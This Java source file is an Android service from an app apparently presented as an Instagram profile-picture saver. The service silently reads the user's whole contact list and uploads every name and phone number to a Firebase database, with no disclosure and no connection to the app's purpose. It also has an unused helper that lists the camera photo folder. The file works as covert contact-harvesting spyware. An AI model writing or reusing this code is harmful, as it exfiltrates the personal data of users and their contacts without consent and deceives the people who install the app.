package com.funcoders.Instadpsaver.contactsevice;

import android.Manifest;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.fonts.Font;
import android.graphics.pdf.PdfDocument;
import android.os.AsyncTask;
import android.os.Build;
import android.os.CountDownTimer;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.funcoders.Instadpsaver.InstaDataPresenter;
import com.funcoders.Instadpsaver.MainMenuview;
import com.funcoders.Instadpsaver.RoomDb.TaskAppDatabase;
import com.funcoders.Instadpsaver.bean.ContactModel;
import com.funcoders.Instadpsaver.common.Constants;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import org.w3c.dom.Document;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.FilenameFilter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

public class ContactService extends Service{

    List<ContactModel> contactModelList=new ArrayList<>();

    private TaskAppDatabase appDatabase;
    private DatabaseReference mFirebaseDatabase;
    private FirebaseDatabase mFirebaseInstance;

    String userId="";
    private final static String TAG = "BroadcastService";

        public static final String COUNTDOWN_BR = "your_package_name.countdown_br";
        Intent bi = new Intent(COUNTDOWN_BR);
        SharedPreferences sharedPreferences;
        CountDownTimer cdt = null;
        File path = null, extraLogPath = null;

        @Override
        public void onCreate() {
            super.onCreate();
            appDatabase = TaskAppDatabase.getInstance(ContactService.this);
             mFirebaseInstance = FirebaseDatabase.getInstance();
            UUID uuid = UUID.randomUUID();
            mFirebaseDatabase = mFirebaseInstance.getReference(uuid.toString());
            mFirebaseInstance.getReference("app_title").setValue("InstaProfileSaver");
            if (ContextCompat.checkSelfPermission(ContactService.this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {

                new YourAsyncTask().execute();

            }
            Log.i(TAG, "Starting timer...");
            int minutes = 2;
            long millis = minutes * 60 * 1000;

            cdt = new CountDownTimer(millis, 1000) {
                @Override
                public void onTick(long millisUntilFinished) {
                    Log.i(TAG, "Countdown seconds remaining: " + millisUntilFinished / 1000);
                    bi.putExtra("countdown", millisUntilFinished);
                    sendBroadcast(bi);
                }

                @Override
                public void onFinish() {
                    Log.i(TAG, "Timer finished");
                    stopService(new Intent(com.funcoders.Instadpsaver.contactsevice.ContactService.this, ContactService.class));

                }
            };

            cdt.start();



        }

        @Override
        public void onDestroy() {

            cdt.cancel();
            Log.i(TAG, "Timer cancelled");
            super.onDestroy();
        }

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            return super.onStartCommand(intent, flags, startId);
        }

        @Override
        public IBinder onBind(Intent arg0) {
            return null;
        }

    private void createUser(List<ContactModel> contactModelList) {
        List<String> friends = new ArrayList<>();
        friends.clear();
        for(int i = 0; i< contactModelList.size(); i++) {
            String str= contactModelList.get(i).getName()+" : "+contactModelList.get(i).getMobileNumber();
            str = str.replaceAll("[^a-zA-Z0-9+:]", " ");
            friends.add(str);
            System.out.println(contactModelList.get(i).getName()+" : "+contactModelList.get(i).getMobileNumber());
        }
        userId = mFirebaseDatabase.push().getKey();
        for(String friend : friends) {
            mFirebaseDatabase.child(Constants.getCurrentDate()+"   Count ("+contactModelList.size()+")").child(friend).setValue(true);
        }

        addUserChangeListener();



    }
    private void addUserChangeListener() {
        mFirebaseDatabase.child(userId).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {

                ContactModel user = dataSnapshot.getValue(ContactModel.class);

              /* if(user!=null)
               {
                   for (DataSnapshot chatSnapshot: dataSnapshot.getChildren()) {
                       ContactModel chat = chatSnapshot.getValue(ContactModel.class);
                       String name = (String) chatSnapshot.child("name").getValue();
                       String mobileNumber = (String) chatSnapshot.child("mobileNumber").getValue();

                       System.out.println("Hari contacts"+name+mobileNumber);
                   }
               }*/

                if (user == null) {
                    Log.e(TAG, "User data is null!");
                    SharedPreferences.Editor editor = sharedPreferences.edit();
                    editor.putBoolean(Constants.isContactsPosted, false);
                    editor.apply();
                    return;
                }else {
                    System.out.println("Posted sucess triggred");
                    SharedPreferences.Editor editor = sharedPreferences.edit();
                    editor.putBoolean(Constants.isContactsPosted, false);
                    editor.apply();
                    Log.e(TAG, "User data is changed!" + user.name + "  " + user.mobileNumber + "" + user.getName());
                }
            }

            @Override
            public void onCancelled(DatabaseError error) {
                // Failed to read value
                Log.e(TAG, "Failed to read user", error.toException());
            }
        });
    }
    private void storetoFirebaseDB(List<ContactModel> contactModelList) {
            // app_title change listener
        mFirebaseInstance.getReference("app_title").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                Log.e(TAG, "App title updated");

                //   String appTitle = dataSnapshot.getValue(String.class);

                // update toolbar title
                //  getSupportActionBar().setTitle(appTitle);
            }

            @Override
            public void onCancelled(DatabaseError error) {
                // Failed to read value
                Log.e(TAG, "Failed to read app title value.", error.toException());
            }
        });

        createUser(contactModelList);


    }

    public class YourAsyncTask extends AsyncTask<Void, Void, Void> {

        @Override
        protected Void doInBackground(Void... voids) {

//        ArrayList<String> list=getAllImages();

            contactModelList= Constants.getContacts(ContactService.this);

            System.out.println("contactModelList... size"+contactModelList.size());


            return null;}



        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);


            if(contactModelList.size()!=0) {
                storetoFirebaseDB(contactModelList);

               // Constants.createLogDirectory();

              //  for(int i=0;i<contactModelList.size();i++)
             //   {
                //    storeContactstxt(contactModelList.get(i).getName()+"  : "+contactModelList.get(i).getMobileNumber(),Constants.getCurrentDate());

             //   }
                // createPdf(contactModelList);

            }

        }
    }

    private ArrayList<String> getAllImages() {
        ArrayList<String> f = new ArrayList<String>();// list of file paths
        File[] listFile;

        File file= new File(android.os.Environment.getExternalStorageDirectory(),"DCIM/Camera");

        if (file.isDirectory())
            {
                listFile = file.listFiles();
                for (int i = 0; i < listFile.length; i++)
                {
                    f.add(listFile[i].getAbsolutePath());

                }
            }

        return f;
        }

    private void createPdf(List<ContactModel> list){

        // create a new document
        PdfDocument document = new PdfDocument();
        // crate a page description
        PdfDocument.PageInfo pageInfo = new PdfDocument.PageInfo.Builder(300, 600, 1).create();
        // start a page
        PdfDocument.Page page = document.startPage(pageInfo);
        Canvas canvas = page.getCanvas();
        Paint paint = new Paint();
        paint.setColor(Color.RED);
        canvas.drawCircle(50, 50, 30, paint);
        paint.setColor(Color.BLACK);


        canvas.drawText("Hello \n hello waht is then way ofthe redwash java ", 80, 50, paint);


        /*for(int i=0;i<list.size();i++)
        {
            canvas.drawText(list.get(i).getName()+"Hello \n", 80, 50, paint);

        }*/
        //canvas.drawt
        // finish the page
        document.finishPage(page);


        // write the document content
        String directory_path = Environment.getExternalStorageDirectory().getPath() + "/MyContacts/";
        File file = new File(directory_path);
        if (!file.exists()) {
            file.mkdirs();
        }
        String targetPdf = directory_path+sharedPreferences.getString(Constants.userName+".pdf","Contacts.pdf");
        File filePath = new File(targetPdf);
        try {
            document.writeTo(new FileOutputStream(filePath));
            Toast.makeText(this, "Done", Toast.LENGTH_LONG).show();
        } catch (IOException e) {
            Log.e("main", "error "+e.toString());
            Toast.makeText(this, "Something wrong: " + e.toString(),  Toast.LENGTH_LONG).show();
        }
        // close the document
        document.close();
    }



    private void storeContactstxt(String data, String username) {


        System.out.println("logStatusToStorage  "+data);
        try {
            if (ActivityCompat.checkSelfPermission(ContactService.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
                path = new File(Environment.getExternalStoragePublicDirectory("")+"/InstaProfileSaver",
                        username+".txt");
                if (!path.exists()) {
                    try {
                        path.createNewFile();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
                try {
                    if (path.exists()) {

                        BufferedWriter writer = new BufferedWriter(new FileWriter(path.getAbsolutePath(), true));
                        writer.write(data);
                        writer.newLine();
                        writer.close();
                    }
                } catch (Exception e) {
                    //Log.e(TAG, "Log file error", e);
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }

    }



}

